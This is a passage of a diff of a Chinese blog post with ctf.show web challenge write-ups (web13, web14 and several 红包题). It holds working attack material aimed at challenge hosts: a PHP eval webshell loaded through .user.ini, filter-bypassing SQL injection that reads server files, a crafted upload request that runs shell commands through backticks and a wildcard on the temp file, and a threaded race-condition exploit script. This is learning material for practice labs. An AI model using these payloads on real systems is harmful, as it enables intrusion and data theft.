 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png" alt="image-20251118220156878"></p>
 <p><code>?cmd=phpinfo();</code> 发现一堆函数被禁用</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png" alt="image-20251118221516632"></p>
 <p><code>?cmd=print_r(glob('*'));</code>查看一下目录文件</p>
 <p><code>?cmd=highlight_file('903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php');</code>查看文件得到flag</p>
-<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>通过<code>/upload.php.bak</code>看源码：</p>
+<h2 id="web13">web13</h2>
+<p>通过<code>/upload.php.bak</code>看源码：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png" alt="image-20251119124310212"></p>
 <p>发现文件名，大小，类型都做了限制</p>
 <p><code>.user.ini</code>：</p>
-<p>在php中”.user.ini”有如下解释：php会在每个目录下搜寻文件名，如果设定为空字符串则php不会搜寻，也就是在“.user.ini”中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。</p>
+<p>在php中".user.ini"有如下解释：php会在每个目录下搜寻文件名，如果设定为空字符串则php不会搜寻，也就是在“.user.ini”中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。</p>
 <p>有两种方法：</p>
 <p>auto_prepend_file:在页面顶部加载文件</p>
 <p>auto_append_file:在页面底部加载文件</p>
 <p>在.user.ini中填写<code>auto_prepend_file=a.txt</code>，上传</p>
 <p>a.txt：</p>
-<!--?php eval($_GET[c]);?-->
-
-<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>当c=3时返回here_1s_your_f1ag.php</p>
+<p>&lt;?php eval($_GET[c]);?&gt;</p>
+<h2 id="web14">web14</h2>
+<p>当c=3时返回here_1s_your_f1ag.php</p>
 <p><code>/here_1s_your_f1ag.php</code>进入登录界面</p>
 <p>F12得到提示，过滤了information_schema.tables和information_schema.columns</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png" alt="image-20251119212313395"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1/**/order/**/by/**/1#</span><br><span class="line">//只有1个回显位置</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/database()#</span><br><span class="line">//web</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/user()#</span><br><span class="line">//root用户</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema='web'#</span><br><span class="line">//tables加上反引号绕过  </span><br><span class="line">//content</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'#</span><br><span class="line">//id,username,password</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content#</span><br><span class="line">//1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</span><br></pre></td></tr></tbody></table></figure>
-<p><code>-1/**/union/**/select/**/load_file('/etc/nginx/nginx.conf')</code><br>//看网站根目录，确定是/var/www/html</p>
+<pre><code>1/**/order/**/by/**/1#
+//只有1个回显位置
+
+-1/**/union/**/select/**/database()#
+//web
+
+-1/**/union/**/select/**/user()#
+//root用户
+
+-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema='web'#
+//tables加上反引号绕过  
+//content
+
+-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'#
+//id,username,password
+
+-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content#
+//1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...
+</code></pre>
+<p><code>-1/**/union/**/select/**/load_file('/etc/nginx/nginx.conf')</code><br>
+//看网站根目录，确定是/var/www/html</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png" alt="image-20251119221110751"></p>
-<p> <code>-1/**/union/**/select/**/load_file('/var/www/html/secret.php')</code></p>
+<p><code>-1/**/union/**/select/**/load_file('/var/www/html/secret.php')</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png" alt="image-20251119221233886"></p>
 <p>最后看一下<code>/real_flag_is_here</code>得到flag</p>
-<h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/1826091">参考1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/Ethan552525/article/details/118459568">参考2</a></p>
+<h2 id="红包题第二弹">红包题第二弹</h2>
+<p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/1826091">参考1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/Ethan552525/article/details/118459568">参考2</a></p>
 <p>源码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang="zh-CN"&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;</span><br><span class="line">    &lt;meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_红包题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;!-- hint:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_GET['cmd'])){</span><br><span class="line">            $cmd=$_GET['cmd'];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){</span><br><span class="line">            </span><br><span class="line">                die("cerror");</span><br><span class="line">            }</span><br><span class="line">            if(preg_match("/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){</span><br><span class="line">                die("serror");</span><br><span class="line">            }</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        }</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<pre><code>&lt;?php
+#error_reporting(0);
+?&gt;
+&lt;html lang="zh-CN"&gt;
 
+&lt;head&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+    &lt;meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" /&gt;
+    &lt;title&gt;ctf.show_红包题&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;center&gt;
+    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;
+    &lt;h4&gt;where is the flag?&lt;/h4&gt;
+    &lt;/center&gt;
+    &lt;!-- hint:?cmd= --&gt;
+    &lt;?php
+        if(isset($_GET['cmd'])){
+            $cmd=$_GET['cmd'];
+            highlight_file(__FILE__);
+            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
+            
+                die("cerror");
+            }
+            if(preg_match("/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
+                die("serror");
+            }
+            eval($cmd);
+        
+        }
+    
+     ?&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
 <ol>
-<li><p>PHP上传机制：</p>
+<li>
+<p>PHP上传机制：</p>
 <p>在php中，使用<code>Content-Type: multipart/form-data;</code>上传文件时，会将它保存在临时文件中，在php的配置中<code>upload_tmp_dir</code>参数为保存临时文件的路经，linux下面默认为<code>/tmp</code>。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为phpXXXX.tmp（Windows中）、php**.tmp（Linux中）。</p>
 </li>
-<li><p>PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如<!--?php echo`whoami`; ?--> 会直接当作命令执行</p>
+<li>
+<p>PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如&lt;?php echo<code>whoami</code>; ?&gt; 会直接当作命令执行</p>
 </li>
-<li><p><code>.</code>号相当于<code>source</code>命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行</p>
+<li>
+<p><code>.</code>号相当于<code>source</code>命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行</p>
 </li>
-<li><p><code>&lt;?=</code>相当于<code>&lt;?php ehco</code>的简写版</p>
+<li>
+<p><code>&lt;?=</code>相当于<code>&lt;?php ehco</code>的简写版</p>
 </li>
-<li><p><code>?</code>相当于字符的通配符，负责执行上传的临时文件，/??p/p?p??????匹配/tmp/phpxxxxxx</p>
+<li>
+<p><code>?</code>相当于字符的通配符，负责执行上传的临时文件，/??p/p?p???匹配/tmp/phpxxxxxx</p>
 </li>
-<li><p>payload构造</p>
+<li>
+<p>payload构造</p>
 <blockquote>
 <p>/?cmd=?&gt;&lt;?=<code>.+/??p/p?p??????</code>;</p>
 </blockquote>
@@ -287,61 +461,133 @@ btf.addGlobalFn('pjaxSend', () => {
 <p><code>+</code>：相当于空格</p>
 <p><code>?</code>：文字通配符</p>
 </li>
-<li><p>构造数据包</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: "Windows"</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Content-Length: 243</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name="fileUpload"; filename="1.txt"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<li>
+<p>构造数据包</p>
+<pre><code class="language-shell">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1
+Host: 6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
+Content-Length: 243
 
+-----------------------------10242300956292313528205888
+Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
+Content-Type: text/plain
+ 
+#! /bin/sh
+
+cat /flag.txt
+-----------------------------10242300956292313528205888--
+
+</code></pre>
 <p><code>Content-Type有两个值</code>:</p>
 <ol>
 <li>application/x-www-form-urlencoded(默认值) ：上传键值对</li>
 <li>multipart/form-data：上传文件</li>
 </ol>
 <p><code>boundary=</code>:boundary定义边界符  <strong>multipart/form-data 格式的分隔符</strong>，核心作用是<strong>区分上传的多个表单数据块（如文件、普通表单字段）</strong>，避免不同数据内容混淆。</p>
-<p>文件开始标记：—————————–10242300956292313528205888<br>文件结束标记：—————————–10242300956292313528205888–<br>其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</p>
+<p>文件开始标记：-----------------------------10242300956292313528205888<br>
+文件结束标记：-----------------------------10242300956292313528205888–<br>
+其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</p>
 <p><code>#! /bin/bash</code>#! /bin/sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh</p>
 <p><code>cat /flag.txt</code>执行命令得到flag（先ls / 看看根目录，发现有flag.txt）</p>
 </li>
 </ol>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png" alt="image-20251118235305477"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png" alt="image-20251118235342177"></p>
-<h2 id="红包第六弹"><a href="#红包第六弹" class="headerlink" title="红包第六弹"></a>红包第六弹</h2><p>dirsearch扫描目录</p>
+<h2 id="红包第六弹">红包第六弹</h2>
+<p>dirsearch扫描目录</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119224834780.png" alt="image-20251119224834780"></p>
 <p><code>/web.zip</code>得到源码</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119225321166.png" alt="image-20251119225321166"></p>
 <p>通过源码发现key.dat文件，尝试下载</p>
 <p>参考脚本</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化</span><br><span class="line">i=str(time.localtime().tm_min)</span><br><span class="line">#生成token</span><br><span class="line">m=hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">url="http://bdedf572-c2a4-41ff-966d-3cb094d5eabb.challenge.ctf.show/check.php?token={}&amp;php://input".format(m)</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        if "ctfshow" in r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            pass</span><br><span class="line">        # print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print("somthing went wrong!")</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open('key.dat','rb') as t:</span><br><span class="line">    data1=t.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(50):</span><br><span class="line">    threading.Thread(target=POST,args=(data1,)).start()</span><br><span class="line">for i in range(50):</span><br><span class="line">    data2='emmmmm'</span><br><span class="line">    threading.Thread(target=POST,args=(data2,)).start()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code>import requests
+import time
+import hashlib
+import threading
 
-<h4 id="攻击原理流程："><a href="#攻击原理流程：" class="headerlink" title="攻击原理流程："></a>攻击原理流程：</h4><ol>
-<li><strong>第一次请求</strong>（发送key.dat内容）：<ul>
+#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化
+i=str(time.localtime().tm_min)
+#生成token
+m=hashlib.md5(i.encode()).hexdigest()
+url="http://bdedf572-c2a4-41ff-966d-3cb094d5eabb.challenge.ctf.show/check.php?token={}&amp;php://input".format(m)
+
+def POST(data):
+    try:
+        r=requests.post(url,data=data)
+        if "ctfshow" in r.text:
+            print(r.text)
+            pass
+        # print(r.text)
+        pass
+    except Exception as e:
+        print("somthing went wrong!")
+        pass
+    pass
+
+with open('key.dat','rb') as t:
+    data1=t.read()
+    pass
+for i in range(50):
+    threading.Thread(target=POST,args=(data1,)).start()
+for i in range(50):
+    data2='emmmmm'
+    threading.Thread(target=POST,args=(data2,)).start()
+</code></pre>
+<h4 id="攻击原理流程：">攻击原理流程：</h4>
+<ol>
+<li><strong>第一次请求</strong>（发送key.dat内容）：
+<ul>
 <li>系统接收数据并保存为flag.dat</li>
 <li>此时：flag.dat内容 = key.dat内容</li>
 <li>MD5相同，但SHA512也相同（因为内容相同）</li>
-<li>不满足”SHA512不同”的条件</li>
+<li>不满足"SHA512不同"的条件</li>
 </ul>
 </li>
-<li><strong>第二次请求</strong>（发送简单字符串）：<ul>
+<li><strong>第二次请求</strong>（发送简单字符串）：
+<ul>
 <li>系统接收数据并<strong>覆盖</strong>flag.dat</li>
 <li>此时：flag.dat内容 = “emmmmm”</li>
-<li>MD5不同（因为内容不同），不满足”MD5相同”条件</li>
+<li>MD5不同（因为内容不同），不满足"MD5相同"条件</li>
 </ul>
 </li>
 </ol>
-<h4 id="关键：并发攻击的时间窗口"><a href="#关键：并发攻击的时间窗口" class="headerlink" title="关键：并发攻击的时间窗口"></a>关键：并发攻击的时间窗口</h4><p>通过并发发送大量请求，攻击者利用了一个<strong>时间窗口</strong>：</p>
+<h4 id="关键：并发攻击的时间窗口">关键：并发攻击的时间窗口</h4>
+<p>通过并发发送大量请求，攻击者利用了一个<strong>时间窗口</strong>：</p>
 <ol>
 <li>在极短时间内，第一个请求使flag.dat等于key.dat内容（满足MD5相同）</li>
-<li>紧接着，第二个请求使flag.dat变为”emmmmm”内容（MD5不同）</li>
-<li><strong>但在验证过程中</strong>，系统可能在不同时间点读取flag.dat：<ul>
+<li>紧接着，第二个请求使flag.dat变为"emmmmm"内容（MD5不同）</li>
+<li><strong>但在验证过程中</strong>，系统可能在不同时间点读取flag.dat：
+<ul>
 <li>读取MD5时：flag.dat还是key.dat内容（MD5相同）</li>
-<li>读取SHA512时：flag.dat已经变成”emmmmm”内容（SHA512不同）</li>
+<li>读取SHA512时：flag.dat已经变成"emmmmm"内容（SHA512不同）</li>
 </ul>
 </li>
 </ol>
-<h4 id="为什么要发送50次？"><a href="#为什么要发送50次？" class="headerlink" title="为什么要发送50次？"></a>为什么要发送50次？</h4><h4 id="增加成功率的策略："><a href="#增加成功率的策略：" class="headerlink" title="增加成功率的策略："></a>增加成功率的策略：</h4><ol>
+<h4 id="为什么要发送50次？">为什么要发送50次？</h4>
+<h4 id="增加成功率的策略：">增加成功率的策略：</h4>
+<ol>
 <li><strong>时间窗口很小</strong>：需要在系统处理的极短时间内完成两次文件写入</li>
 <li><strong>并发增加机会</strong>：50个线程并发执行，增加在正确时间窗口内命中的概率</li>
 <li><strong>容错机制</strong>：网络延迟、服务器处理速度等因素可能导致单次请求失败</li>
 </ol>
-<h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png" alt="image-20251120214432028"></p>
+<h2 id="红包题第七弹">红包题第七弹</h2>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png" alt="image-20251120214432028"></p>
 <p>打开<code>/backdoor.php</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503983.png" alt="image-20251120214616786"></p>
 <p><code>git-dumper https://17624533-04d3-43fa-af1d-8b99f4d0b05e.challenge.ctf.show/.git ./output</code></p>
@@ -352,27 +598,15 @@ btf.addGlobalFn('pjaxSend', () => {
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503986.png" alt="image-20251120221335715"></p>
 <p>POST传参<code>Letmein=highlight_file("../flag.txt");</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503987.png" alt="image-20251120221905487"></p>
-<h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>弱口令</p>
+<h2 id="萌新专属红包题">萌新专属红包题</h2>
+<p>弱口令</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png" alt="image-20251120222955518"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png" alt="image-20251120223027976"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png" alt="image-20251120223450461"></p>
-<h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><p>注册登录</p>
+<h2 id="CTFshow-web1">CTFshow web1</h2>
+<p>注册登录</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120225424837.png" alt="image-20251120225416475"></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://YU030X.github.io">YU030X</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yu030x.github.io/2025/11/19/ctfshow-web%E9%A2%98/">https://yu030x.github.io/2025/11/19/ctfshow-web题/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://YU030X.github.io" target="_blank">YU030X的小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/01/isctf2025/" title="ISCTF2025 WP"><img class="cover" src="/img/%E5%BE%8B%E5%B8%881.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">ISCTF2025 WP</div></div><div class="info-2"><div class="info-item-1">比赛的时候就做了几道题</div></div></div></a><a class="pagination-related" href="/2025/10/08/picgo-test/" title="picgo_test"><img class="cover" src="/img/%E5%BE%8B%E5%B8%887.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">picgo_test</div></div><div class="info-2"><div class="info-item-1">图床测试</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/10/ctfshow-web1-20/" title="Ctfshow Web1-20 信息收集"><img class="cover" src="/img/%E5%BE%8B%E5%B8%885.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-10</div><div class="info-item-2">Ctfshow Web1-20 信息收集</div></div><div class="info-2"><div class="info-item-1">慢慢打基础</div></div></div></a><a class="pagination-related" href="/2026/01/09/cs2026/" title="CTFSHOW-2026元旦跨年欢乐赛"><img class="cover" src="/img/%E5%BE%8B%E5%B8%884.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-09</div><div class="info-item-2">CTFSHOW-2026元旦跨年欢乐赛</div></div><div class="info-2"><div class="info-item-1">新年快乐！期末复习间偷闲做了一两道</div></div></div></a><a class="pagination-related" href="/2026/01/17/ctfshow-web21-28/" title="Ctfshow Web21-28 爆破"><img class="cover" src="/img/%E5%BE%8B%E5%B8%887.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-17</div><div class="info-item-2">Ctfshow Web21-28 爆破</div></div><div class="info-2"><div class="info-item-1">慢慢打基础</div></div></div></a><a class="pagination-related" href="/2025/12/01/isctf2025/" title="ISCTF2025 WP"><img class="cover" src="/img/%E5%BE%8B%E5%B8%881.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">ISCTF2025 WP</div></div><div class="info-2"><div class="info-item-1">比赛的时候就做了几道题</div></div></div></a><a class="pagination-related" href="/2026/01/18/ctfshow-web29-124/" title="Ctfshow Web29-124"><img class="cover" src="/img/%E5%BE%8B%E5%B8%886.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-18</div><div class="info-item-2">Ctfshow Web29-124</div></div><div class="info-2"><div class="info-item-1">慢慢打基础</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/yu030x.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">YU030X</div><div class="author-info-description">哈哈哈哈</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div 